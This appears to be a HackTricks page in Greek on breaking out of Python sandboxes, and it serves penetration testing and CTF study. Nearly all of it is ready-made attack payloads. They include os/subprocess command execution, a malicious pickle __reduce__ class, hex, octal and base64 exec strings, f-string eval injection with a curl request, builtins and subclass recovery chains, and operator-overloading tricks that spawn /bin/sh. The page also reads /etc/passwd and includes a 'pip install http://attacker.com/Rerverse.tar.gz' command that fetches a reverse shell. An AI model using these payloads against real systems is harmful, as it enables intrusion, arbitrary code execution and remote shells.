# Παράκαμψη Python sandboxes

{{#include ../../../banners/hacktricks-training.md}}

Αυτά είναι μερικά tricks για την παράκαμψη των προστασιών Python sandbox και την εκτέλεση αυθαίρετων εντολών.<sup>[[1]](#references)[[2]](#references)</sup>

{{#ref}}
js2py-sandbox-escape-cve-2024-28397.md
{{#endref}}


## Βιβλιοθήκες εκτέλεσης εντολών

Το πρώτο πράγμα που πρέπει να γνωρίζετε είναι αν μπορείτε να εκτελέσετε απευθείας code με κάποια ήδη imported βιβλιοθήκη ή αν μπορείτε να κάνετε import κάποια από αυτές τις βιβλιοθήκες:
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
Να θυμάστε ότι οι συναρτήσεις _**open**_ και _**read**_ μπορούν να φανούν χρήσιμες για την **ανάγνωση αρχείων** μέσα στο python sandbox και για τη **συγγραφή κώδικα** που θα μπορούσατε να **εκτελέσετε** για να **παρακάμψετε** το sandbox.

> [!CAUTION] > Η συνάρτηση **Python2 input()** επιτρέπει την εκτέλεση κώδικα python πριν το πρόγραμμα καταρρεύσει.

Η Python προσπαθεί να **φορτώσει libraries από τον τρέχοντα κατάλογο πρώτα** (η ακόλουθη εντολή θα εμφανίσει από πού φορτώνει η python τα modules): `python3 -c 'import sys; print(sys.path)'`

![Bypass Python sandboxes - Command Execution Libraries: Η Python προσπαθεί να φορτώσει libraries από τον τρέχοντα κατάλογο πρώτα (η ακόλουθη εντολή θα εμφανίσει από πού φορτώνει η python τα modules...](<../../../images/image (559).png>)

## Bypass pickle sandbox με τα default εγκατεστημένα python packages

### Default packages

Μπορείτε να βρείτε μια **λίστα προεγκατεστημένων** packages εδώ: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
Σημειώστε ότι από ένα pickle μπορείτε να κάνετε το python env να **εισάγει αυθαίρετα libraries** που είναι εγκατεστημένα στο σύστημα.\
Για παράδειγμα, το ακόλουθο pickle, όταν φορτωθεί, θα εισαγάγει τη pip library για να τη χρησιμοποιήσει:
```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```
Για περισσότερες πληροφορίες σχετικά με τον τρόπο λειτουργίας του pickle, δείτε: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)<sup>[[16]](#references)</sup>

### Πακέτο Pip

Κόλπο που κοινοποιήθηκε από τον **@isHaacK**

Αν έχετε πρόσβαση στο `pip` ή στο `pip.main()`, μπορείτε να εγκαταστήσετε ένα αυθαίρετο package και να αποκτήσετε ένα reverse shell καλώντας:
```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```
Μπορείτε να κατεβάσετε το package για τη δημιουργία του reverse shell εδώ. Παρακαλώ σημειώστε ότι, πριν το χρησιμοποιήσετε, πρέπει να το **αποσυμπιέσετε, να αλλάξετε το `setup.py` και να βάλετε τη δική σας IP για το reverse shell**:

{{#file}}
Reverse.tar (1).gz
{{#endfile}}

> [!TIP]
> Αυτό το package ονομάζεται `Reverse`. Ωστόσο, έχει δημιουργηθεί ειδικά έτσι ώστε, όταν εξέλθετε από το reverse shell, η υπόλοιπη εγκατάσταση να αποτύχει, επομένως **δεν θα παραμείνει εγκατεστημένο κανένα επιπλέον python package στον server** όταν αποχωρήσετε.

## Εκτέλεση python code με eval

> [!WARNING]
> Σημειώστε ότι το exec επιτρέπει strings πολλών γραμμών και το `;`, ενώ το eval όχι (ελέγξτε τον walrus operator)

Αν ορισμένοι χαρακτήρες απαγορεύονται, μπορείτε να χρησιμοποιήσετε την αναπαράσταση **hex/octal/B64** για να **παρακάμψετε** τον περιορισμό:
```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```
### F-string sinks επανεκτέλεσης

Ένα διαφορετικό αλλά πολύ συνηθισμένο bug είναι να **εισάγετε δεδομένα που ελέγχει ο attacker σε ένα string και, στη συνέχεια, να αξιολογείτε αυτό το string ως f-string**. Αυτό **δεν είναι Jinja/SSTI· ο ίδιος ο Python interpreter εκτελεί οτιδήποτε τοποθετείται μέσα στο `{...}` κατά το δεύτερο στάδιο αξιολόγησης**:<sup>[[10]](#references)</sup>
```python
def template(first, last, gender):
text = f"Patient {first} {last} ({gender})"
return eval(f"f'''{text}'''")
```

```python
s = "2+3"
eval(f"f'''{s}'''")
# '2+3'

s = "{2+3}"
eval(f"f'''{s}'''")
# '5'
```
Έτσι, αν επιτρέπονται άγκιστρα, εισαγωγικά, τελείες, κάτω παύλες και παρενθέσεις, ένα payload όπως το παρακάτω συνήθως επιτρέπει την εκτέλεση εντολών:
```python
{__import__("os").popen("id").read()}
```
Εάν τα κενά ή οι shell metacharacters φιλτράρονται, τυλίξτε την εντολή σε Base64 και αποκωδικοποιήστε την μέσα στην έκφραση:
```python
{__import__("os").popen(__import__("base64").b64decode("aWQK").decode()).read()}
```
Χρήσιμα μοτίβα αναζήτησης:

- `eval(f"f'''{user_input}'''")`
- `eval(f'f"{user_input}"')`
- Κώδικας που δημιουργεί ένα template με δεδομένα χρήστη και στη συνέχεια καλεί `eval`, `exec` ή `compile` πάνω στο αναδημιουργημένο string
- XML/JSON handlers που επικυρώνουν χαρακτήρες με regexes, αλλά εξακολουθούν να επιτρέπουν `{}` και εισαγωγικά

Αν το sink βρίσκεται πίσω από ένα Flask endpoint που αναλύει raw XML/bytes από το `request.data`, θυμηθείτε ότι το `curl -d` χρησιμοποιεί από προεπιλογή το `application/x-www-form-urlencoded`, γεγονός που μπορεί να αφήσει το `request.data` κενό. Χρησιμοποιήστε έναν **μη-form** τύπο περιεχομένου:
```bash
curl http://127.0.0.1:54321/addPatient \
-X POST \
-H 'Content-Type: application/xml' \
-d '<patient><firstname>a</firstname><lastname>b</lastname><sender_app>app</sender_app><timestamp>1</timestamp><birth_date>01/01/2000</birth_date><gender>{2+3}</gender></patient>'
```
### Άλλες βιβλιοθήκες που επιτρέπουν την εκτέλεση κώδικα Python μέσω eval
```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```
Δείτε επίσης ένα escape από sandboxed evaluator σε πραγματικό περιβάλλον, σε PDF generators:

- Αξιολόγηση εκφράσεων με τριπλές αγκύλες [[[...]]] στο ReportLab/xhtml2pdf → RCE (CVE-2023-33733). Εκμεταλλεύεται το rl_safe_eval για να αποκτήσει πρόσβαση στα function.__globals__ και os.system μέσω αξιολογούμενων attributes (για παράδειγμα, του χρώματος γραμματοσειράς) και επιστρέφει μια έγκυρη τιμή ώστε η απόδοση να παραμένει σταθερή.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>

{{#ref}}
reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

## Operators και σύντομα tricks
```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```
## Παράκαμψη προστασιών μέσω encodings (UTF-7)

Στο [**αυτό το writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) χρησιμοποιείται το UFT-7 για τη φόρτωση και εκτέλεση αυθαίρετου κώδικα Python μέσα σε ένα φαινομενικό sandbox:<sup>[[11]](#references)</sup>
```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
```
Είναι επίσης δυνατό να παρακαμφθεί χρησιμοποιώντας άλλες κωδικοποιήσεις, π.χ. `raw_unicode_escape` και `unicode_escape`.

## Εκτέλεση Python χωρίς calls

Αν βρίσκεστε μέσα σε ένα Python jail που **δεν σας επιτρέπει να κάνετε calls**, εξακολουθούν να υπάρχουν τρόποι να **εκτελέσετε αυθαίρετες functions, code** και **commands**.

### RCE με [decorators](https://docs.python.org/3/glossary.html#term-decorator)
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
### RCE με δημιουργία objects και overloading

Αν μπορείς να **declare μια class** και να **create ένα object** αυτής της class, θα μπορούσες να **write/overwrite διαφορετικά methods** που μπορούν να **triggered** **χωρίς** να **χρειάζεται να τα καλέσεις** απευθείας.

#### RCE με custom classes

Μπορείς να τροποποιήσεις ορισμένα **class methods** (_κάνοντας overwrite σε υπάρχοντα class methods ή δημιουργώντας μια νέα class_) ώστε να **execute arbitrary code** όταν **triggered**, χωρίς να τα καλείς απευθείας.
```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
#### Δημιουργία αντικειμένων με [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)

Το βασικό πλεονέκτημα των metaclasses είναι ότι μας επιτρέπουν να **δημιουργήσουμε ένα instance μιας κλάσης, χωρίς να καλέσουμε απευθείας τον constructor**, δημιουργώντας μια νέα κλάση με την target κλάση ως metaclass.<sup>[[15]](#references)</sup>
```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```
#### Δημιουργία objects με exceptions

Όταν ενεργοποιείται ένα **exception**, δημιουργείται ένα object της **Exception** χωρίς να χρειάζεται να καλέσετε απευθείας τον constructor (ένα trick από τον [**@\_nag0mez**](https://mobile.twitter.com/_nag0mez)):
```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```
### Περισσότερο RCE
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### Ανάγνωση αρχείου με τα builtins help & license
```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
```
## Ενσωματωμένες συναρτήσεις

- [**Ενσωματωμένες συναρτήσεις της python2**](https://docs.python.org/2/library/functions.html)
- [**Ενσωματωμένες συναρτήσεις της python3**](https://docs.python.org/3/library/functions.html)

Αν μπορείτε να αποκτήσετε πρόσβαση στο αντικείμενο **`__builtins__`**, μπορείτε να εισαγάγετε βιβλιοθήκες (σημειώστε ότι μπορείτε επίσης να χρησιμοποιήσετε εδώ άλλες αναπαραστάσεις συμβολοσειρών που εμφανίζονται στην τελευταία ενότητα):
```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```
### Χωρίς Builtins

Όταν δεν διαθέτετε `__builtins__`, δεν θα μπορείτε να κάνετε import τίποτα ούτε καν να διαβάσετε ή να γράψετε αρχεία, καθώς **όλες οι global functions** (όπως οι `open`, `import`, `print`...) **δεν έχουν φορτωθεί**.\
Ωστόσο, **από προεπιλογή το Python φορτώνει πολλά modules στη μνήμη**. Αυτά τα modules μπορεί να φαίνονται ακίνδυνα, αλλά ορισμένα από αυτά **κάνουν επίσης import επικίνδυνων** λειτουργιών στο εσωτερικό τους, οι οποίες μπορούν να προσπελαστούν για την επίτευξη ακόμη και **arbitrary code execution**.<sup>[[4]](#references)[[5]](#references)</sup>

Στα παρακάτω παραδείγματα μπορείτε να δείτε πώς να **κάνετε abuse** σε ορισμένα από αυτά τα "**ακίνδυνα**" modules που έχουν φορτωθεί, ώστε να **αποκτήσετε πρόσβαση** σε **επικίνδυνες** **λειτουργίες** στο εσωτερικό τους.

**Python2**
```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
#### Python3
```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
help.__call__.__builtins__ # or __globals__
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
print.__self__
dir.__self__
globals.__self__
len.__self__
__build_class__.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```
[**Παρακάτω υπάρχει μια μεγαλύτερη συνάρτηση**](#recursive-search-of-builtins-globals) για την εύρεση δεκάδων/**εκατοντάδων** **σημείων** όπου μπορείτε να βρείτε τα **builtins**.

#### Python2 και Python3
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```
### Payloads των Builtins
```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```
## Καθολικές και τοπικές μεταβλητές

Ο έλεγχος των **`globals`** και **`locals`** είναι ένας καλός τρόπος για να γνωρίζετε τι μπορείτε να προσπελάσετε.
```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```
[**Παρακάτω υπάρχει μια μεγαλύτερη συνάρτηση**](#recursive-search-of-builtins-globals) για να βρείτε δεκάδες/**εκατοντάδες** **σημεία** όπου μπορείτε να βρείτε τα **globals**.

## Ανακάλυψη Arbitrary Execution

Εδώ θέλω να εξηγήσω πώς μπορείτε να ανακαλύψετε εύκολα **περισσότερες επικίνδυνες λειτουργίες που έχουν φορτωθεί** και να προτείνετε πιο αξιόπιστα exploits.

#### Πρόσβαση σε subclasses με bypasses

Ένα από τα πιο ευαίσθητα μέρη αυτής της τεχνικής είναι η δυνατότητα **πρόσβασης στις base subclasses**. Στα προηγούμενα παραδείγματα αυτό γινόταν με τη χρήση του `''.__class__.__base__.__subclasses__()`, αλλά υπάρχουν **και άλλοι πιθανοί τρόποι**:
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

# This can be useful in case it is not possible to make calls (therefore using decorators)
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # From https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-builtins-no-mro-single-exec

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```
### Εντοπισμός φορτωμένων επικίνδυνων βιβλιοθηκών

Για παράδειγμα, γνωρίζοντας ότι με τη βιβλιοθήκη **`sys`** είναι δυνατή η **εισαγωγή αυθαίρετων βιβλιοθηκών**, μπορείτε να αναζητήσετε όλα τα **φορτωμένα modules που έχουν κάνει import το sys στο εσωτερικό τους**:
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```
Υπάρχουν πολλά, και **χρειαζόμαστε μόνο ένα** για να εκτελούμε εντολές:
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```
